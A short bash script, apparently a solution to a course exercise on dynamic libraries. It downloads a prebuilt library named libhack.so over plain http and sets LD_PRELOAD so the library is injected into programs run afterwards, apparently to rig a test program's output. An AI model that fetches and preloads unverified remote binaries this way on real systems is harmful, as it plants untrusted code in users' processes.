#!/bin/bash
wget -P ..  http://raw.githubusercontent.com/odalson/alx-low_low_level_programming/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD="$PWD/../libhack.so"
